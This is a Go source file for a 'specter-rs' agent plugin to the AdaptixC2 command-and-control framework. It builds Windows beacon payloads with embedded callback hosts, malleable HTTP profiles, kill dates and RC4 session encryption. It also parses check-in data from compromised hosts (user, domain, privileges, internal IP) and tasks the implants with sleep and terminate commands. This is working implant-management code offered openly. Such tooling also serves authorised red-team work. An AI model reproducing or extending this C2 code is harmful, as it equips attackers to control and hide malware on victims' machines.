// Specter-rs agent plugin for AdaptixC2 v1.2 (axc2 v1.2.0).
//
// Hybrid architecture (docs/ETUDE-DE-FAISABILITE.md §2): the beacon is the
// Rust rewrite, this plugin is the server-side build entry — the equivalent
// of specter's agent_specter, against the AdaptixC2 1.2 plugin ABI (the
// original specter targets 2.0).
//
// The single interface point with the beacon is the SPT_CONFIG JSON
// contract (decision 2026-10-22): BuildPayload writes the per-build config
// (AES key, sleep/jitter, watermark, kill epoch, malleable profile v2) and
// drives the beacon's own pipeline (make → cargo → rust-lld → blob).
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
)

var (
	ModuleDir     string
	AgentWatermark string
)

type PluginAgent struct{}

type ExtenderAgent struct{}

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	if impl, ok := ts.(Teamserver); ok {
		Ts = impl
	}
	return &PluginAgent{}
}

// Teamserver: the server surface specter-rs currently exercises (the
// native beacon_agent declares the full interface; only these members are
// used by the MVP wire handlers).
type Teamserver interface {
	TsConvertCpToUTF8(data string, cp int) string
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
}

var Ts Teamserver

// RC4Crypt: the session cipher (Encrypt == Decrypt == RC4, docs/WIRE.md) —
// same cipher, same keystream, as the beacon's specter_core::rc4.
func RC4Crypt(data []byte, key []byte) ([]byte, error) {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(data))
	cipher.XORKeyStream(out, data)
	return out, nil
}

// Dialog argument helpers (native beacon_agent semantics).
func getStringArg(args map[string]any, key string) (string, error) {
	if value, ok := args[key].(string); ok {
		return value, nil
	}
	return "", fmt.Errorf("parameter '%s' must be set", key)
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	if value, ok := args[key].(float64); ok {
		return value, nil
	}
	return 0, fmt.Errorf("parameter '%s' must be a number", key)
}

// Command ids on the wire (native beacon_agent, pl_utils.go).
const (
	COMMAND_TERMINATE = 10
	COMMAND_PROFILE   = 21
)

// int32ToIPv4: host-order u32 to dotted quad (native pl_utils.go).
func int32ToIPv4(value uint) string {
	return fmt.Sprintf("%d.%d.%d.%d", byte(value), byte(value>>8), byte(value>>16), byte(value>>24))
}

// GetOsVersion: port of the native beacon_agent mapping (pl_utils.go).
func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isServer bool, systemArch string) (int, string) {
	var (
		desc      string
		os        = adaptix.OS_UNKNOWN
		osVersion = "unknown"
	)

	if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 26100 {
		osVersion = "Win 2025 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 19045 {
		osVersion = "Win 2022 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 17763 {
		osVersion = "Win 2019 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && !isServer && buildNumber >= 22000 {
		osVersion = "Win 11"
	} else if majorVersion == 10 && minorVersion == 0 && isServer {
		osVersion = "Win 2016 Serv"
	} else if majorVersion == 10 && minorVersion == 0 {
		osVersion = "Win 10"
	} else if majorVersion == 6 && minorVersion == 3 && isServer {
		osVersion = "Win Serv 2012 R2"
	} else if majorVersion == 6 && minorVersion == 3 {
		osVersion = "Win 8.1"
	} else if majorVersion == 6 && minorVersion == 2 && isServer {
		osVersion = "Win Serv 2012"
	} else if majorVersion == 6 && minorVersion == 2 {
		osVersion = "Win 8"
	} else if majorVersion == 6 && minorVersion == 1 && isServer {
		osVersion = "Win Serv 2008 R2"
	} else if majorVersion == 6 && minorVersion == 1 {
		osVersion = "Win 7"
	}

	desc = osVersion + " " + systemArch
	if strings.Contains(osVersion, "Win") {
		os = adaptix.OS_WINDOWS
	}
	return os, desc
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// GenerateConfig: the generation dialog fields (keys = container.put names
// in ax_config.axs).
type GenerateConfig struct {
	Format     string `json:"format"`
	Sleep      string `json:"sleep"`
	Jitter     int    `json:"jitter"`
	IsKillDate bool   `json:"is_killdate"`
	KillDate   string `json:"kill_date"`
	KillTime   string `json:"kill_time"`
	Debug      bool   `json:"debug"`
}

// sptConfig: the beacon build contract (crates/core/build.rs).
type sptConfig struct {
	AESKey      string          `json:"aes_key"`
	ListenerKey string          `json:"listener_key"`
	SleepMS     int             `json:"sleep_ms"`
	JitterMS    int             `json:"jitter_ms"`
	Watermark   uint32          `json:"watermark"`
	KillEpoch   int64           `json:"kill_epoch"`
	Profile     json.RawMessage `json:"profile"`
}

// listenerConfig: the fields of the listener's saved profile (TransportConfig
// of the BeaconHTTP listener) that shape the beacon — the listener is
// authoritative, the malleable profile provides the defaults it overrides.
type listenerConfig struct {
	CallbackAddresses []string `json:"callback_addresses"`
	EncryptKey        string   `json:"encrypt_key"`
	Uri               []string `json:"uri"`
	UserAgent         []string `json:"user_agent"`
	HbHeader          string   `json:"hb_header"`
	RequestHeaders    string   `json:"request_headers"`
	PagePayload       string   `json:"page-payload"`
}

// listenerOverrides validates the listener profile: a beacon built against
// a mismatched listener can never check in, so every mismatch fails the
// build instead of the first check-in.
func listenerOverrides(raw []byte) (listenerConfig, error) {
	var conf listenerConfig
	if err := json.Unmarshal(raw, &conf); err != nil {
		return conf, fmt.Errorf("listener profile: %w", err)
	}
	if len(conf.CallbackAddresses) == 0 {
		return conf, errors.New("listener profile: callback_addresses is required")
	}
	if len(conf.Uri) == 0 {
		return conf, errors.New("listener profile: uri is required")
	}
	if len(conf.UserAgent) == 0 {
		return conf, errors.New("listener profile: user_agent is required")
	}
	if conf.HbHeader == "" {
		return conf, errors.New("listener profile: hb_header is required")
	}
	if !strings.Contains(conf.PagePayload, "<<<PAYLOAD_DATA>>>") {
		return conf, errors.New("listener profile: page-payload must contain '<<<PAYLOAD_DATA>>>'")
	}
	// encrypt_key: 32 hex chars (16 bytes) — the listener validates the same.
	if len(conf.EncryptKey) != 32 {
		return conf, errors.New("listener profile: encrypt_key must be 32 hex chars")
	}
	if _, err := hex.DecodeString(conf.EncryptKey); err != nil {
		return conf, errors.New("listener profile: encrypt_key must be hex")
	}
	return conf, nil
}

// applyListener overrides the malleable profile with the listener's actual
// enforcement points (URI list, UA, hb_header, request headers, response
// page template, callback hosts).
func applyListener(profileRaw json.RawMessage, l listenerConfig) (json.RawMessage, error) {
	var prof map[string]any
	if err := json.Unmarshal(profileRaw, &prof); err != nil {
		return nil, fmt.Errorf("malleable profile: %w", err)
	}

	prof["hosts"] = l.CallbackAddresses
	prof["user_agent"] = l.UserAgent[0]
	prof["beacon_id_header"] = l.HbHeader

	post, ok := prof["post"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post section")
	}
	post["uris"] = l.Uri

	client, ok := post["client"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.client section")
	}
	if metadata, ok := client["metadata"].(map[string]any); ok {
		metadata["name"] = l.HbHeader
	}
	headers := []string{}
	for _, line := range strings.Split(l.RequestHeaders, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			headers = append(headers, line)
		}
	}
	client["headers"] = headers

	server, ok := post["server"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.server section")
	}
	output, ok := server["output"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.server.output section")
	}
	const marker = "<<<PAYLOAD_DATA>>>"
	idx := strings.Index(l.PagePayload, marker)
	output["prepend"] = l.PagePayload[:idx]
	output["append"] = l.PagePayload[idx+len(marker):]

	return json.Marshal(prof)
}

// parseDurationMS parses "30s" / "1h 2m 5s" style sleep values.
func parseDurationMS(s string) (int, error) {
	total := 0
	fields := strings.Fields(s)
	if len(fields) == 0 {
		return 0, errors.New("empty sleep value")
	}
	for _, f := range fields {
		unit := f[len(f)-1]
		num, err := strconv.Atoi(f[:len(f)-1])
		if err != nil || num < 0 {
			return 0, fmt.Errorf("invalid sleep field %q", f)
		}
		switch unit {
		case 'h':
			total += num * 3600_000
		case 'm':
			total += num * 60_000
		case 's':
			total += num * 1000
		default:
			return 0, fmt.Errorf("invalid sleep unit in %q (use h/m/s)", f)
		}
	}
	return total, nil
}

// beaconRepo returns the specter-rs checkout used for the build. The team
// server controls it with SPECTER_RS_DIR; the default covers the dev setup.
func beaconRepo() string {
	if dir := os.Getenv("SPECTER_RS_DIR"); dir != "" {
		return dir
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return filepath.Join(home, "Documents", "specter-rs")
}

// malleableProfile reads the malleable profile v2 shipped next to the
// plugin. Hosts wiring per-listener comes with the phase 3 transport.
func malleableProfile() (json.RawMessage, error) {
	path := filepath.Join(ModuleDir, "profile_default.json")
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("malleable profile: %w", err)
	}
	return json.RawMessage(data), nil
}

// GenerateProfiles: one embedded profile per listener profile (v1.2 calls
// this before BuildPayload; multi_listeners is false in config.yaml).
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, err
	}
	if _, err := parseDurationMS(generateConfig.Sleep); err != nil {
		return nil, err
	}
	mp, err := malleableProfile()
	if err != nil {
		return nil, err
	}
	out := make([][]byte, 0, len(profile.ListenerProfiles))
	for range profile.ListenerProfiles {
		out = append(out, mp)
	}
	return out, nil
}

// BuildPayload: compose the SPT_CONFIG JSON and drive the beacon pipeline.
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("specter-rs builds against exactly one listener")
	}

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}

	sleepMS, err := parseDurationMS(generateConfig.Sleep)
	if err != nil {
		return nil, "", err
	}
	// Dialog jitter is a percentage (beacon convention); the beacon's jitter
	// is symmetric +/- ms (docs/PARITE.md, documented assumption).
	jitterMS := sleepMS * generateConfig.Jitter / 100

	watermark, err := strconv.ParseUint(AgentWatermark, 16, 32)
	if err != nil {
		return nil, "", fmt.Errorf("watermark %q: %w", AgentWatermark, err)
	}

	var killEpoch int64
	if generateConfig.IsKillDate {
		dt := generateConfig.KillDate + " " + generateConfig.KillTime
		t, err := time.Parse("02.01.2006 15:04:05", dt)
		if err != nil {
			return nil, "", errors.New("invalid killdate, use dd.MM.yyyy + HH:mm:ss")
		}
		killEpoch = t.Unix()
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, "", err
	}

	listener, err := listenerOverrides(profile.ListenerProfiles[0].Profile)
	if err != nil {
		return nil, "", err
	}
	profileJSON, err := applyListener(agentProfiles[0], listener)
	if err != nil {
		return nil, "", err
	}

	cfg := sptConfig{
		AESKey:      hex.EncodeToString(key),
		ListenerKey: listener.EncryptKey,
		SleepMS:     sleepMS,
		JitterMS:    jitterMS,
		Watermark:   uint32(watermark),
		KillEpoch:   killEpoch,
		Profile:     profileJSON,
	}
	cfgJSON, err := json.Marshal(cfg)
	if err != nil {
		return nil, "", err
	}

	tmp, err := os.CreateTemp("", "specter-rs-config-*.json")
	if err != nil {
		return nil, "", err
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)
	if _, err := tmp.Write(cfgJSON); err != nil {
		tmp.Close()
		return nil, "", err
	}
	tmp.Close()

	repo := beaconRepo()
	if repo == "" {
		return nil, "", errors.New("SPECTER_RS_DIR not set and no home directory")
	}

	cmd := exec.Command("make", "-C", repo, "blob")
	cmd.Env = append(os.Environ(), "SPT_CONFIG="+tmpPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, "", fmt.Errorf("beacon build failed: %v\n%s", err, string(out))
	}

	blob, err := os.ReadFile(filepath.Join(repo, "build", "beacon.x64.bin"))
	if err != nil {
		return nil, "", fmt.Errorf("beacon blob not found after build: %w", err)
	}

	// Dead-blob guard (docs/ETUDE-DE-FAISABILITE.md 8bis): -Oz legally
	// eliminates any runtime path that is provably dead at compile time
	// (the iteration 8 bug: a too-short buffer made the whole HTTP
	// transaction vanish while every pipeline gate stayed green). The
	// only reliable detector is the produced bytes themselves: the blob
	// must embed every listener parameter it was built against.
	if err := verifyBlobEmbedsListener(blob, listener); err != nil {
		return nil, "", err
	}
	return blob, "bin", nil
}

// verifyBlobEmbedsListener: the generated blob must contain the listener's
// beat key, callback hosts, URIs, hb_header and page template — anything
// missing means the consuming code path was optimized out.
func verifyBlobEmbedsListener(blob []byte, l listenerConfig) error {
	key, err := hex.DecodeString(l.EncryptKey)
	if err != nil {
		return fmt.Errorf("listener encrypt_key: %w", err)
	}
	const marker = "<<<PAYLOAD_DATA>>>"
	idx := strings.Index(l.PagePayload, marker)

	needles := [][]byte{key, []byte(l.HbHeader), []byte(l.PagePayload[:idx]), []byte(l.PagePayload[idx+len(marker):])}
	for _, h := range l.CallbackAddresses {
		needles = append(needles, []byte(h))
	}
	for _, u := range l.Uri {
		needles = append(needles, []byte(u))
	}
	for _, n := range needles {
		if !bytes.Contains(blob, n) {
			return fmt.Errorf("generated blob does not embed listener parameter %q — the consuming code path was eliminated (dead blob)", n)
		}
	}
	return nil
}

// CreateAgent: parse the first check-in beat (docs/WIRE.md — the 19-field
// CheckPacker sequence of the native beacon_agent, tag v1.2).
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

	return agentData, &ExtenderAgent{}, nil
}

// --- ExtenderAgent: the session wire (RC4 + the native pack formats). ---

func (e *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (e *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// PackTasks: [u32 LE total size || [taskData.Data || u32 LE taskId]*].
func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err := PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	return packData, nil
}

func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("specter-rs pivots land with the SMB transport (phase 3+)")
}

// CreateCommand: the operator command surface (native beacon_agent
// semantics): sleep -> COMMAND_PROFILE subop 1, terminate ->
// COMMAND_TERMINATE with the exit method. The beacon parses exactly
// these records (crates/core/src/transport.rs).
func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	var array []interface{}

	switch command {

	case "sleep":
		var sleepTime int
		sleep, err := getStringArg(args, "sleep")
		if err != nil {
			goto RET
		}
		jitter, _ := getFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepInt, err := strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			var t time.Duration
			t, err = time.ParseDuration(sleep)
			if err != nil {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
			sleepTime = int(t.Seconds())
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}
		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
			messageData.Message = "Task: terminate agent thread"
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
			messageData.Message = "Task: terminate agent process"
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	default:
		err = fmt.Errorf("Command '%v' not found", command)
		goto RET
	}

	taskData.Data, err = PackArray(array)

RET:
	return taskData, messageData, err
}

// ProcessData: beacon results — the listener frame (flags 0, u32 LE
// origLen — uncompressed pass-through of decompressZlibData), then the
// u32 BE size and the per-task records the beacon emits.
func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	// Listener frame: flags:1 + origLen:4 (LE). Uncompressed passthrough
	// when the flag is clear — the beacon never compresses (MVP).
	if len(decryptedData) < 5 {
		return errors.New("failed to unmarshal message")
	}
	flags := decryptedData[0]
	origLen := int(decryptedData[1]) | int(decryptedData[2])<<8 | int(decryptedData[3])<<16 | int(decryptedData[4])<<24
	data := decryptedData[5:]
	if flags != 0 {
		return errors.New("specter-rs MVP sends uncompressed frames only")
	}
	if len(data) != origLen {
		return errors.New("failed to unmarshal message")
	}

	packer := CreatePacker(data)

	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			break
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int", "int", "int"}) {
				goto HANDLER
			}
			subcommand := packer.ParseInt32()
			if subcommand != 1 {
				goto HANDLER
			}
			agentData.Sleep = packer.ParseInt32()
			agentData.Jitter = packer.ParseInt32()
			task.Message = "Sleep time has been changed"
			_ = Ts.TsAgentUpdateData(agentData)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}
			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}

func (e *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{}
}

func (e *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{}
}
